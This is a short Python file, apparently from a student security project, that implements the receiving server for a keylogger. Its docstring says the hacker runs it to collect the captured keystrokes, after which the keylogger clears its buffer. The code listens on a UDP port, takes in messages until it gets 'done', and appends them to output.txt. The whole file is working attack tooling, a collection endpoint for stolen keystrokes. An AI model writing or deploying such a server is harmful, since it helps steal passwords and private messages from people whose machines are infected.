"""
keylogserver.py
Authors: Dominick Taylor (dxt9140@g.rit.edu)
         Bikash
         Isza
When run by the hacker, this file is responsible for pinging the keylogger on
the agreed upon hostname and port and then receiving the obtained data. Once
the file is sent to this server, the keylogger will clear its own buffer.
"""

import socket

DEFAULT_PORT = 35476

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    connection = ('localhost', DEFAULT_PORT)
    s.bind(connection)

    f = open("output.txt", 'a')

    running = True

    while running:
        message, addr = s.recvfrom(1024)
        print(message) 
        if message == "done":
            running = False
            break
        f.write( message )

    f.close()
        

if __name__ == '__main__':
    main()

